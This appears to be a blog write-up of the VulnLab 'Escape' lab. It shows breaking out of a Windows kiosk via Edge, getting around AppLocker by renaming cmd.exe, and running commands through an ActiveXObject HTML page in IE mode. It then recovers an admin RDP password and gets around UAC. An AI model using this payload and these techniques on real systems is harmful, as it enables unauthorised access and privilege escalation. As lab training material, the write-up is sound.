@@ -1,0 +1,303 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Escape | chidori</title><meta name="author" content="Jon Loh"><meta name="copyright" content="Jon Loh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="TLDRLearn how to escape a Windows Kiosk and gain RCE on a Windows machine. You will bypass UAC to gain local admin privileges. Enumeration1234567891011(jon@kali)-[~&#x2F;vulnLab&#x2F;easy&#x2F;escape]$ sudo nmap -p-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Escape">
+<meta property="og:url" content="http://example.com/2026/01/27/Escape/index.html">
+<meta property="og:site_name" content="chidori">
+<meta property="og:description" content="TLDRLearn how to escape a Windows Kiosk and gain RCE on a Windows machine. You will bypass UAC to gain local admin privileges. Enumeration1234567891011(jon@kali)-[~&#x2F;vulnLab&#x2F;easy&#x2F;escape]$ sudo nmap -p-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com//images/Escape/escape_vl.png">
+<meta property="article:published_time" content="2026-01-27T03:35:12.000Z">
+<meta property="article:modified_time" content="2026-05-25T15:47:49.410Z">
+<meta property="article:author" content="Jon Loh">
+<meta property="article:tag" content="Insecure AppLocker Configurations">
+<meta property="article:tag" content="Insecure Windows Kiosk Configurations">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com//images/Escape/escape_vl.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Escape",
+  "url": "http://example.com/2026/01/27/Escape/",
+  "image": "http://example.com//images/Escape/escape_vl.png",
+  "datePublished": "2026-01-27T03:35:12.000Z",
+  "dateModified": "2026-05-25T15:47:49.410Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jon Loh",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/avatar.jpg"><link rel="canonical" href="http://example.com/2026/01/27/Escape/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Escape',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      if ($loadingBox.classList.contains('loaded')) return
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+
+  if (document.readyState === 'complete') {
+    preloader.endLoading()
+  } else {
+    window.addEventListener('load', preloader.endLoading)
+    document.addEventListener('DOMContentLoaded', preloader.endLoading)
+    // Add timeout protection: force end after 7 seconds
+    setTimeout(preloader.endLoading, 7000)
+  }
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/VulnLab"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/%5Cimages%5CEscape%5Cescape_vl.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">chidori</span></a><a class="nav-page-title" href="/"><span class="site-name">Escape</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/VulnLab"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Escape</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-01-27T03:35:12.000Z" title="Created 2026-01-27 11:35:12">2026-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-05-25T15:47:49.410Z" title="Updated 2026-05-25 23:47:49">2026-05-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/VulnLab/">VulnLab</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h1><p>Learn how to escape a Windows Kiosk and gain RCE on a Windows machine. You will bypass UAC to gain local admin privileges.</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(jon@kali)-[~/vulnLab/easy/escape]$ <span class="built_in">sudo</span> nmap -p- --min-rate=1000 -T4 escape.vl</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 16:09 +08</span><br><span class="line">Stats: 0:06:46 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">Initiating SYN Stealth Scan at 16:09</span><br><span class="line">Nmap scan report <span class="keyword">for</span> escape.vl (10.10.65.187)</span><br><span class="line">Host is up (0.16s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 718.57 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Only port 3389 for RDP is open.</li>
+</ul>
+<h2 id="RDP-3389"><a href="#RDP-3389" class="headerlink" title="RDP (3389)"></a>RDP (3389)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(jon@kali)-[~/vulnLab/easy/escape]$ <span class="built_in">sudo</span> nmap -p3389 --script <span class="string">&quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot;</span> -T4 escape.vl</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 16:25 +08</span><br><span class="line">Nmap scan report <span class="keyword">for</span> escape.vl (10.10.65.187)</span><br><span class="line">Host is up (0.17s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| rdp-enum-encryption:</span><br><span class="line">|   Security layer</span><br><span class="line">|     CredSSP (NLA): SUCCESS</span><br><span class="line">|     CredSSP with Early User Auth: SUCCESS</span><br><span class="line">|     RDSTLS: SUCCESS</span><br><span class="line">|     SSL: SUCCESS</span><br><span class="line">|   RDP Protocol Version: Unknown</span><br><span class="line">|_  (This script attempts to determine <span class="built_in">which</span> Security layer and Encryption level is supported by the RDP service)</span><br><span class="line"></span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: ESCAPE</span><br><span class="line">|   NetBIOS_Domain_Name: ESCAPE</span><br><span class="line">|   NetBIOS_Computer_Name: ESCAPE</span><br><span class="line">|   DNS_Domain_Name: Escape</span><br><span class="line">|   DNS_Computer_Name: Escape</span><br><span class="line">|   Product_Version: 10.0.19041</span><br><span class="line">|   System_Time: 2026-01-22T08:25:24+00:00</span><br><span class="line">|_  (This script extracts target information from NTLMSSP responses during RDP authentication)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 6.03 seconds</span><br></pre></td></tr></table></figure>
+<ul>
+<li>RDP enumeration with Nmap scripts proved insignificant.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5Crdp.png" alt="RDP to escape.vl"></p>
+<ul>
+<li>Without any credentials, I attempted to RDP to <code>escape.vl</code> using rdesktop. You can also use xfreerdp. A new window spawned with a message - “Login as KioskUser0 without Password”. We have a username now.</li>
+</ul>
+<h1 id="Gaining-a-Foothold-Escaping-Windows-Kiosk"><a href="#Gaining-a-Foothold-Escaping-Windows-Kiosk" class="headerlink" title="Gaining a Foothold (Escaping Windows Kiosk)"></a>Gaining a Foothold (Escaping Windows Kiosk)</h1><p><img src="/%5Cimages%5CEscape%5Ckiosk.png" alt="Busan Expo Kiosk"></p>
+<ul>
+<li>Clicking on the box, we login as KioskUser0 without a password and see a “Busan Expo” site. Honestly, I couldn’t tell if this was a wallpaper, or a web application 😂 But by the looks of this, it looks like a Windows Kiosk. We need to find a way to escape this Kiosk and gain functional access to the machine.</li>
+<li>A Windows Kiosk is a locked-down mode of Windows that restricts a device to running only 1 app or a controlled set of apps. Thus, preventing users from accessing the parts of the operating system. Think of this as a super restrictive session.</li>
+<li>Doing some research on how to escape Windows Kiosks, I found <a target="_blank" rel="noopener" href="https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/">this article</a> and will be following its steps to gain interactive control of the <code>escape.vl</code> machine.</li>
+</ul>
+<h2 id="Escaping-Browser-Restrictions"><a href="#Escaping-Browser-Restrictions" class="headerlink" title="Escaping Browser Restrictions"></a>Escaping Browser Restrictions</h2><h3 id="Via-the-URL-bar"><a href="#Via-the-URL-bar" class="headerlink" title="Via the URL bar"></a>Via the URL bar</h3><p><img src="/images%5CEscape%5Curl_bar.png" alt="URL Bar"></p>
+<ul>
+<li>In the Edge browser, we can use the top search bar to interact with the machine by typing <code>C:\</code>. This creates a GUI of the machine’s file system.</li>
+<li>I found the <code>user.txt</code> file in KioskUser0’s Desktop.</li>
+<li>I couldn’t find any user credentials after exploring the machine’s file system.</li>
+</ul>
+<p><img src="/images%5CEscape%5Calert_message.png" alt="Browser Alert message"></p>
+<ul>
+<li>Typing <code>ftp://something</code> in the URL bar, an alert message appears. Translating the text, it says “This site is trying to open an app. The website is attempting to open this application.”. 열기 is open and 취소 is close.</li>
+<li>Click open and use Microsoft Edge to open the app. Remember to uncheck the “항상 이 앱 사용 (Always use this app)” option in the prompt box, otherwise you won’t get to choose what application to run next time.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5Cms_edge.png" alt="MS Edge"></p>
+<ul>
+<li>We now have a functioning Microsoft Edge browser to interact with.</li>
+</ul>
+<h3 id="Via-File-Explorer"><a href="#Via-File-Explorer" class="headerlink" title="Via File Explorer"></a>Via File Explorer</h3><p><img src="/images%5CEscape%5Cfile_explorer.png" alt="Escape Kiosk via File Explorer"></p>
+<ul>
+<li>It’s also possible to open a functioning Microsoft Edge browser using File Explorer. In the restrictive browser, type Ctrl + O to open File Explorer. Search <code>msedge.exe</code> and press enter to start a new Microsoft Edge browser. With this approach, I tried opening <code>cmd.exe</code> from the file explorer window but nothing happened, likely due to the app restrictions in the Windows Kiosk.</li>
+</ul>
+<h1 id="RCE-on-escape-vl"><a href="#RCE-on-escape-vl" class="headerlink" title="RCE on escape.vl"></a>RCE on <code>escape.vl</code></h1><h2 id="Via-Name-based-AppLocker-Bypass"><a href="#Via-Name-based-AppLocker-Bypass" class="headerlink" title="Via Name-based AppLocker Bypass"></a>Via Name-based AppLocker Bypass</h2><p><img src="/%5Cimages%5CEscape%5Crestrict_cmd.png" alt="CMD restricted"></p>
+<ul>
+<li>With access to the file system in the browser, search for <code>cmd.exe</code> and download it.</li>
+<li>Click on the folder icon in the Downloads list when its done. Now, we’ve escaped MS Edge and entered File Explorer. Due to AppLocker, I failed to run <code>cmd.exe</code>.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\kioskUser0\Downloads\msedge.exe</span><br><span class="line">The system cannot find message text <span class="keyword">for</span> message number 0x2350 <span class="keyword">in</span> the message file <span class="keyword">for</span> Application.</span><br><span class="line"></span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\kioskUser0\Downloads&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Knowing that I could run MS Edge, I renamed <code>cmd.exe</code> to <code>msedge.exe</code> and successfully opened a CMD shell. Due to AppLocker, right-clicking doesn’t work, so I used the keyboard shortcut for this.</li>
+</ul>
+<h2 id="Via-ActiveXObject"><a href="#Via-ActiveXObject" class="headerlink" title="Via ActiveXObject"></a>Via ActiveXObject</h2><p>Searching how to get RCE on a machine from an unrestricted Edge browser, I found this <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/44825859/get-output-on-shell-execute-in-js-with-activexobject">StackOverflow post</a> which explains how to get a shell in JavaScript with ActiveXObject. However, the usage of shell-executing functions in JavaScript, like ActiveXObject, don’t work on Microsoft Edge, as they insecure. Searching again, I found this <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/answers/questions/2370784/enable-activex-control-in-microsoft-edge-latest?forum=microsoftedge-all&referrer=answers">other post</a> that explains how to enable ActiveX control in Microsoft Edge.</p>
+<p><img src="/%5Cimages%5CEscape%5Cie_mode_blog.png" alt="Use IE Mode Blog"></p>
+<ul>
+<li>The post says IE mode in Edge must be enabled to use ActiveXObject.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5Cenable_ie_mode.png" alt="Enable IE Mode"></p>
+<ul>
+<li>To enable IE mode, navigate to Settings &gt; Default Browser and set “Allow sites to be reloaded in Internet Explorer Mode (IE Mode)” to Allow. We can also specify the pages to open in IE mode. We can use this feature to specify the path to our reverse shell to get RCE on <code>escape.vl</code>. Since the pages must be in <code>.html</code> format, we’ll put our code in a <code>.html</code> file. Click the blue Restart button to restart the browser for our <code>pwn.html</code> file to run in IE mode.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5Cpwn_exception.png" alt="Set pwn.html in IE Mode"></p>
+<ul>
+<li>We can only save files to KioskUser0’s Downloads folder, so we’ll put our file there and specify its full path. I’ve not created it yet. We can utilize the Developer Console feature on Edge to modify the HTML code with our malicious code.</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html <span class="built_in">dir</span>=<span class="string">&quot;ltr&quot;</span> lang=<span class="string">&quot;en&quot;</span>&gt;&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">shellExec</span></span>() &#123;</span><br><span class="line">        var cmd = document.getElementById(<span class="string">&#x27;cmd&#x27;</span>).value</span><br><span class="line">        var shell = new ActiveXObject(<span class="string">&quot;WScript.Shell&quot;</span>);</span><br><span class="line">        try &#123;</span><br><span class="line">            var execOut = shell.Exec(<span class="string">&quot;cmd.exe /C \&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            console.log(e);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        var cmdStdOut = execOut.StdOut;</span><br><span class="line">        var out = cmdStdOut.ReadAll();</span><br><span class="line">        alert(out);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;form onsubmit=<span class="string">&quot;shellExec()&quot;</span>&gt;</span><br><span class="line">    Command: &lt;input <span class="built_in">id</span>=<span class="string">&quot;cmd&quot;</span> name=<span class="string">&quot;cmd&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span><br><span class="line">    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Modify the HTML source with this script. Remove all exiting JavaScript, CSS and HTML code to prevent them from interfering with our code. Only keep the <code>&lt;html&gt;</code> and <code>&lt;body&gt;</code> tags. Remember to change the language to English. Save the file in the Downloads folder as <code>pwn.html</code>. Don’t refresh the existing HTML webpage because the modified code will be lost.</li>
+</ul>
+<h1 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h1><h2 id="PrivEsc-to-admin"><a href="#PrivEsc-to-admin" class="headerlink" title="PrivEsc to admin"></a>PrivEsc to admin</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\_admin&gt; <span class="built_in">type</span> .\profiles.xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-16&quot;</span>?&gt;</span><br><span class="line">&lt;!<span class="literal">--</span> Remote Desktop Plus <span class="literal">--</span>&gt;</span><br><span class="line">&lt;<span class="keyword">Data</span>&gt;</span><br><span class="line">  &lt;Profile&gt;</span><br><span class="line">    &lt;ProfileName&gt;admin&lt;/ProfileName&gt;</span><br><span class="line">    &lt;UserName&gt;<span class="number">127.0</span>.<span class="number">0.1</span>&lt;/UserName&gt;</span><br><span class="line">    &lt;Password&gt;WJkd16IDfQxXnmHlKIP8ca0G9XxnWQZgvtPgON2Wc=&lt;/Password&gt;</span><br><span class="line">    &lt;Secure&gt;False&lt;/Secure&gt;</span><br><span class="line">  &lt;/Profile&gt;</span><br><span class="line">&lt;/<span class="keyword">Data</span>&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\_admin&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>The CMD shell from before wasn’t very user-friendly. Switching to PowerShell, I found an encrypted password string for RDP Plus for <strong>admin</strong> in the <code>C:\_admin\profiles.xml</code> directory.</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\kioskUser0\Downloads&gt; <span class="built_in">cp</span> <span class="string">&#x27;C:\Program Files (x86)\Remote Desktop Plus\rdp.exe&#x27;</span> C:\_admin\rdp.exe</span><br><span class="line"><span class="built_in">PS</span> C:\Users\kioskUser0\Downloads&gt; <span class="built_in">cd</span> C:\_admin</span><br><span class="line"><span class="built_in">PS</span> C:\_admin&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\_admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                installers</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                passwords</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                temp</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>          <span class="number">0</span>     Default.rdp</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>        <span class="number">574</span>     profiles.xml</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>     <span class="number">267264</span>     rdp.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Exploring the <code>C:\Program Files (x86)</code> directory, I found a <code>rdp.exe</code> binary and copied it to the <code>C:\_admin</code> directory.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5CbulletPassView.png" alt="BulletPassView.exe"></p>
+<ul>
+<li>With the “Edit profile” wizard open from <code>rdp.exe</code>, I ran BulletPassView from PowerShell and it displayed admin’s plaintext password.</li>
+<li>Although I got admin’s password already, I failed to RDP into <code>escape.vl</code> from Kali Linux. The session returned a long error message on the Windows login page. Likely due to a configure GPOs.</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\_admin&gt; runas /user:admin cmd.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Using <code>runas</code> in PowerShell and admin’s plaintext password, I started a new CMD shell as admin.</li>
+</ul>
+<h2 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h2><p><img src="/%5Cimages%5CEscape%5Cadmin_privs.png" alt="Admin&#39;s Privileges"></p>
+<ul>
+<li>The <strong>admin</strong> is a local administrator but failed to access the <code>C:\Users\Administrator</code> directory, which it should. This means User Access Control (UAC) is likely implemented to restrict this.</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\kioskUser0\Downloads&gt;reg query hkey_local_machine\software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\software\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line">    ConsentPromptBehaviorAdmin    REG_DWORD    <span class="number">0</span>x5</span><br></pre></td></tr></table></figure>
+<ul>
+<li>I checked the registry and found that UAC is enabled. Researching online, I found that Windows applies the “Admin Approval Mode” concept when UAC is applied on local admins. With UAC enabled, sessions are run with standard user permissions by default when logged in as an admin. Hence, I couldn’t access <code>C:\Users\Administrator</code>.</li>
+<li>We need to trigger a UAC prompt to run an elevated terminal for us to accept and grant ourselves true Local Administrator privileges.</li>
+</ul>
+<p><img src="/%5Cimages%5CEscape%5Cadmin_true_privs.png" alt="Admin&#39;s Privileges after bypassing UAC"></p>
